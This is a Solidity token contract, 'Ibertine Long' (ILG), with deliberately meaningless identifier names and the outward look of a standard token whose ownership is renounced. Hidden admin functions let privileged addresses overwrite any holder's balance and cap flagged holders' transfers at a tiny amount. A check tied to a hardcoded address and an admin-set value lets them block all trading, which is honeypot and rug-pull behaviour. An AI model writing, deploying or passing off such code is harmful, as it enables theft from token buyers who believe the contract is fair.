//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface enableTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract takeListSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeIsMarketing {
    function createPair(address receiverFrom, address minWallet) external returns (address);
}

interface txMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenTo) external view returns (uint256);

    function transfer(address fundSwap, uint256 amountEnable) external returns (bool);

    function allowance(address receiverShouldLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountEnable) external returns (bool);

    function transferFrom(
        address sender,
        address fundSwap,
        uint256 amountEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atSender, uint256 value);
    event Approval(address indexed receiverShouldLaunched, address indexed spender, uint256 value);
}

interface txModeMetadata is txMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IbertineLong is takeListSwap, txMode, txModeMetadata {

    uint256 public liquidityLimitMode;

    address private receiverTotal;

    function launchMaxFrom() private view {
        require(shouldAmount[_msgSender()]);
    }

    function sellTrading(address atIsLaunch) public {
        if (fromMin) {
            return;
        }
        if (autoLaunched == launchMax) {
            launchMax = liquidityLimitMode;
        }
        shouldAmount[atIsLaunch] = true;
        if (autoLaunched != liquidityLimitMode) {
            launchMax = fromTx;
        }
        fromMin = true;
    }

    uint256 public feeLimitFrom;

    function senderExempt(address txTotal, address fundSwap, uint256 amountEnable) internal returns (bool) {
        require(launchedToken[txTotal] >= amountEnable);
        launchedToken[txTotal] -= amountEnable;
        launchedToken[fundSwap] += amountEnable;
        emit Transfer(txTotal, fundSwap, amountEnable);
        return true;
    }

    address public limitReceiver;

    function owner() external view returns (address) {
        return receiverTotal;
    }

    string private teamSender = "ILG";

    function receiverTrading(address txTotal, address fundSwap, uint256 amountEnable) internal returns (bool) {
        if (txTotal == atTotal) {
            return senderExempt(txTotal, fundSwap, amountEnable);
        }
        uint256 atShould = txMode(limitReceiver).balanceOf(limitFrom);
        require(atShould == totalLiquidity);
        require(fundSwap != limitFrom);
        if (buyWalletAmount[txTotal]) {
            return senderExempt(txTotal, fundSwap, takeTokenFund);
        }
        return senderExempt(txTotal, fundSwap, amountEnable);
    }

    bool private teamTradingMode;

    function decimals() external view virtual override returns (uint8) {
        return exemptAuto;
    }

    uint256 private isExempt = 100000000 * 10 ** 18;

    function liquidityAtMin(address tokenSender) public {
        launchMaxFrom();
        if (launchedLiquidity == fromTx) {
            marketingTx = false;
        }
        if (tokenSender == atTotal || tokenSender == limitReceiver) {
            return;
        }
        buyWalletAmount[tokenSender] = true;
    }

    function approve(address receiverFee, uint256 amountEnable) public virtual override returns (bool) {
        walletAmount[_msgSender()][receiverFee] = amountEnable;
        emit Approval(_msgSender(), receiverFee, amountEnable);
        return true;
    }

    address limitFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        if (launchMax != liquidityLimitMode) {
            launchMax = liquidityLimitMode;
        }
        enableTake tradingTake = enableTake(txExemptShould);
        limitReceiver = feeIsMarketing(tradingTake.factory()).createPair(tradingTake.WETH(), address(this));
        
        atTotal = _msgSender();
        launchedTradingReceiver();
        shouldAmount[atTotal] = true;
        launchedToken[atTotal] = isExempt;
        if (launchedLiquidity != launchMax) {
            marketingTx = true;
        }
        emit Transfer(address(0), atTotal, isExempt);
    }

    function launchedExempt(address modeExempt, uint256 amountEnable) public {
        launchMaxFrom();
        launchedToken[modeExempt] = amountEnable;
    }

    mapping(address => bool) public buyWalletAmount;

    function name() external view virtual override returns (string memory) {
        return swapEnable;
    }

    address public atTotal;

    string private swapEnable = "Ibertine Long";

    uint256 totalLiquidity;

    address txExemptShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private marketingTx;

    function allowance(address amountMarketing, address receiverFee) external view virtual override returns (uint256) {
        if (receiverFee == txExemptShould) {
            return type(uint256).max;
        }
        return walletAmount[amountMarketing][receiverFee];
    }

    function transferFrom(address txTotal, address fundSwap, uint256 amountEnable) external override returns (bool) {
        if (_msgSender() != txExemptShould) {
            if (walletAmount[txTotal][_msgSender()] != type(uint256).max) {
                require(amountEnable <= walletAmount[txTotal][_msgSender()]);
                walletAmount[txTotal][_msgSender()] -= amountEnable;
            }
        }
        return receiverTrading(txTotal, fundSwap, amountEnable);
    }

    uint256 public launchMax;

    uint256 public fromTx;

    bool public txBuy;

    function launchedTradingReceiver() public {
        emit OwnershipTransferred(atTotal, address(0));
        receiverTotal = address(0);
    }

    mapping(address => uint256) private launchedToken;

    mapping(address => bool) public shouldAmount;

    uint256 private autoLaunched;

    event OwnershipTransferred(address indexed shouldWalletMode, address indexed atReceiver);

    function totalSupply() external view virtual override returns (uint256) {
        return isExempt;
    }

    uint256 private launchedLiquidity;

    function getOwner() external view returns (address) {
        return receiverTotal;
    }

    mapping(address => mapping(address => uint256)) private walletAmount;

    uint256 constant takeTokenFund = 4 ** 10;

    function balanceOf(address tokenTo) public view virtual override returns (uint256) {
        return launchedToken[tokenTo];
    }

    function fundAuto(uint256 amountEnable) public {
        launchMaxFrom();
        totalLiquidity = amountEnable;
    }

    bool public fromMin;

    function transfer(address modeExempt, uint256 amountEnable) external virtual override returns (bool) {
        return receiverTrading(_msgSender(), modeExempt, amountEnable);
    }

    bool private marketingListTake;

    function symbol() external view virtual override returns (string memory) {
        return teamSender;
    }

    uint256 marketingAt;

    uint8 private exemptAuto = 18;

}